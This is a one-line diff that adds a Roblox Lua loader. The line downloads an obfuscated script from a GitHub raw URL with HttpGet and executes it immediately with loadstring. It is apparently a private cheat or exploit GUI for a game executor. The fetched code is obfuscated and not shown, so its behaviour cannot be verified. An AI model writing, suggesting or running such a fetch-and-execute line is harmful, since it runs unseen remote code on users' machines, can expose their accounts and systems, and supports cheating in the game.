@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/N1oGey/Private-guis-by-KrystalArial-/refs/heads/main/obfuscated_script-1776014309415.lua.txt"))()
